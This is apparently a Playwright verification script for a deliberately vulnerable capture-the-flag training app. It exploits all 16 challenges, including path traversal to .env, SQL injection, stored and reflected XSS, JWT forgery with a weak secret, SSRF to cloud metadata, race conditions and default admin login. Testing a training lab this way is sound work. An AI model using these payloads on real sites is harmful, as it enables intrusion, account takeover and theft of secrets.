const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const { randomUUID } = require('node:crypto');
const { chromium } = require('playwright');
const jwt = require('jsonwebtoken');
const { query } = require('../db/database');
const { ensureRuntimeSchema } = require('../db/schema');

async function verify() {
  const target = process.argv[2] || 'http://localhost:3000';
  const label = target.includes('localhost') || target.includes('127.0.0.1') ? 'local' : 'live';
  const prefix = `verify_${randomUUID().replaceAll('-', '').slice(0, 16)}`;
  const sender = prefix + '_sender', recipient = prefix + '_recipient';
  const password = randomUUID();
  const users = [], contexts = [];
  const flags = new Map();
  let browser;
  const output = path.join(__dirname, '..', 'test-results', label);
  fs.mkdirSync(output, { recursive: true });
  function capture(name, body) {
    const flag = body.match(/flag\{[^}]+\}/)?.[0];
    assert.ok(flag, `${name}: expected visible flag`);
    flags.set(name, flag);
    console.log(`PASS ${name}`);
    return flag;
  }
  try {
    await ensureRuntimeSchema();
    browser = await chromium.launch({ channel: process.env.BROWSER_CHANNEL || 'msedge', headless: true });
    const context = await browser.newContext({ baseURL: target, viewport: { width: 1440, height: 1000 } });
    contexts.push(context);
    const page = await context.newPage();
    page.on('dialog', dialog => dialog.accept());
    page.setDefaultTimeout(30000);
    const request = context.request;
    const landing = await request.get('/');
    assert.match(await landing.text(), /\/assets\/backup_flag.txt/);
    capture('html_comment', await (await request.get('/assets/backup_flag.txt')).text());
    const robots = await (await request.get('/robots.txt')).text();
    assert.match(robots, /dev-test-flag-endpoint-do-not-index/);
    capture('robots_txt', await (await request.get('/api/v1/dev-test-flag-endpoint-do-not-index')).text());
    const config = await (await request.get('/js/config.js')).text();
    const key = config.match(/key:\s*'([^']+)'/)[1];
    capture('hardcoded_creds', await (await request.get('/api/secret', { params: { key } })).text());
    assert.equal((await request.get('/api/secret')).status(), 403);
    capture('idor_access', await (await request.get('/api/users/5/profile')).text());
    capture('lfi_traversal', await (await request.get('/api/download', { params: { file: '../../.env' } })).text());
    const traversal = await request.get('/profile/avatar', { params: { f: '../../traversal_flag.txt' } });
    assert.match(traversal.headers()['content-type'], /text\/plain/);
    capture('path_traversal_master', await traversal.text());
    assert.equal((await request.get('/profile/avatar?f=default.png')).status(), 200);
    for (const username of [sender, recipient]) {
      const response = await request.post('/register', { form: { username, password, email: `${username}@example.invalid` } });
      assert.match(await response.text(), /Registration successful/);
      const rows = await query('SELECT id FROM users WHERE username = $1', [username]);
      assert.equal(rows.length, 1, 'Verification database must match the target app');
      users.push(rows[0].id);
    }
    await page.goto('/login');
    await page.locator('[name=username]').fill(sender);
    await page.locator('[name=password]').fill(password);
    await Promise.all([page.waitForURL('**/profile'), page.locator('button[type=submit]').click()]);
    capture('api_overfetch', await (await request.get('/api/user/session-info')).text());
    const png = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+a9o0AAAAASUVORK5CYII=', 'base64');
    await page.locator('#avatar').setInputFiles({ name: 'test.png', mimeType: 'image/png', buffer: png });
    await Promise.all([page.waitForResponse(r => r.url().endsWith('/profile/upload')), page.locator('form[action="/profile/upload"] button').click()]);
    await page.getByText('Avatar uploaded successfully!', { exact: true }).waitFor();
    await page.waitForFunction(() => Array.from(document.querySelectorAll('img[alt="Avatar"]')).every(img => img.complete && img.naturalWidth === 1));
    await page.screenshot({ path: path.join(output, 'avatar.png'), fullPage: true });
    await page.reload();
    await page.waitForFunction(() => document.querySelector('img[alt="Avatar"]').naturalWidth === 1);
    assert.deepEqual(await (await request.get('/profile/avatar?f=current')).body(), png);
    console.log('PASS avatar upload, rendered image, sidebar, and reload');
    await page.goto('/store?review_q=' + encodeURIComponent('<script>alert(1)</script>'));
    capture('xss_reflected', await page.content());
    await page.goto('/store');
    assert.equal((await request.post('/api/store/buy-flag')).status(), 400);
    await page.locator('#promoCode').fill('WELCOME10');
    for (let i = 0; i < 5; i++) {
      await Promise.all([page.waitForResponse(r => r.url().endsWith('/api/promo/redeem')), page.locator('#redeemButton').click()]);
      await page.waitForFunction(() => !document.getElementById('redeemButton').disabled);
    }
    assert.equal(await page.locator('#walletBalance').textContent(), '$550.00');
    await Promise.all([page.waitForResponse(r => r.url().endsWith('/api/store/buy-flag')), page.locator('#purchaseButton').click()]);
    await page.waitForFunction(() => document.getElementById('storeResult').textContent.includes('flag{'));
    capture('race_condition', await page.locator('#storeResult').textContent());
    assert.equal(await page.locator('#walletBalance').textContent(), '$50.00');
    await page.screenshot({ path: path.join(output, 'store-flag.png'), fullPage: true });
    await page.reload();
    assert.match(await page.locator('#storeResult').textContent(), /flag\{/);
    const negative = await request.post('/transfer', { form: { recipient, amount: '-10000' } });
    capture('negative_transfer', await negative.text());
    const massive = await request.post('/transfer', { form: { recipient, amount: '6000' } });
    capture('csrf_transfer', await massive.text());
    const balances = await query('SELECT id, balance FROM users WHERE id = ANY($1::int[]) ORDER BY id', [users]);
    assert.equal(balances[0].balance, 4050);
    assert.equal(balances[1].balance, -3950);
    assert.match(await (await request.post('/transfer', { form: { recipient, amount: 'Infinity' } })).text(), /Invalid transfer details/);
    await page.goto('/jwt/login');
    await page.locator('#webhookUrl').fill('http://169.254.169.254/latest/meta-data/');
    await Promise.all([page.waitForResponse(r => r.url().endsWith('/api/webhook/test')), page.getByRole('button', { name: 'Test', exact: true }).click()]);
    await page.waitForFunction(() => document.getElementById('webhookResult').textContent.includes('flag{'));
    capture('ssrf_metadata', await page.locator('#webhookResult').textContent());
    const tokenResponse = await request.post('/jwt/login', { form: { username: sender, password } });
    const token = (await tokenResponse.text()).match(/class="token-display">([^<]+)</)[1];
    assert.equal((await request.get('/jwt/admin', { params: { token } })).status(), 403);
    const forged = jwt.sign({ ...jwt.decode(token), role: 'admin' }, 'secret');
    capture('jwt_manipulation', await (await request.get('/jwt/admin', { params: { token: forged } })).text());
    assert.equal((await request.post('/api/admin/system-diagnostics')).status(), 403);
    const payload = `<script>fetch('/api/admin/system-diagnostics',{method:'POST',headers:{'X-Requested-With':'XMLHttpRequest'}}).then(r=>r.json()).then(d=>{const p=document.createElement('pre');p.id='verification-diagnostics';p.textContent=d.flag;document.body.appendChild(p);});</script>`;
    await request.post('/profile/update', { form: { bio: payload } });
    await page.goto('/admin/reports');
    await page.locator('#verification-diagnostics').waitFor();
    capture('stored_xss_chain', await page.locator('#verification-diagnostics').textContent());
    await request.post('/profile/update', { form: { bio: '' } });
    const admin = await browser.newContext({ baseURL: target });
    contexts.push(admin);
    await admin.request.post('/login', { form: { username: 'admin', password: 'admin' } });
    capture('default_admin', await (await admin.request.get('/admin/dashboard')).text());
    const injection = await browser.newContext({ baseURL: target });
    contexts.push(injection);
    await injection.request.post('/login', { form: { username: "' OR 1=1--", password: 'incorrect' } });
    capture('sqli_basic', await (await injection.request.get('/profile')).text());
    assert.equal(flags.size, 16);
    for (const [challenge, flag] of flags) {
      const response = await request.post('/submit-flag', { form: { flag } });
      assert.match(await response.text(), /Flag accepted/, `Submit ${challenge}`);
    }
    const duplicate = await request.post('/submit-flag', { form: { flag: flags.get('sqli_basic') } });
    assert.match(await duplicate.text(), /already captured/);
    await page.goto('/submit-flag');
    assert.match(await page.content(), /160 \/ 160 pts/);
    assert.equal(await page.locator('.badge-success').count(), 16);
    await page.screenshot({ path: path.join(output, 'scoreboard.png'), fullPage: true });
    await request.get('/logout');
    assert.equal((await request.get('/api/user/session-info')).status(), 401);
    await request.post('/login', { form: { username: sender, password } });
    assert.match(await (await request.get('/submit-flag')).text(), /160 \/ 160 pts/);
    assert.deepEqual(await (await request.get('/profile/avatar?f=current')).body(), png);
    console.log('PASS all 16 flag submissions, duplicate handling, and progress/avatar after fresh login');
    fs.writeFileSync(path.join(output, 'report.json'), JSON.stringify({ target, verifiedAt: new Date().toISOString(), challenges: [...flags.keys()], points: 160, result: 'PASS' }, null, 2));
  } finally {
    // Delete only accounts and sessions created by this verification run.
    for (const context of contexts) {
      try { await context.request.get('/logout'); } catch {}
    }
    if (browser) await browser.close();
    if (users.length) {
      await query("DELETE FROM sessions WHERE (data->'user'->>'id')::int = ANY($1::int[])", [users]);
      await query('DELETE FROM users WHERE id = ANY($1::int[])', [users]);
    }
  }
}

verify().catch(error => { console.error(error); process.exitCode = 1; });
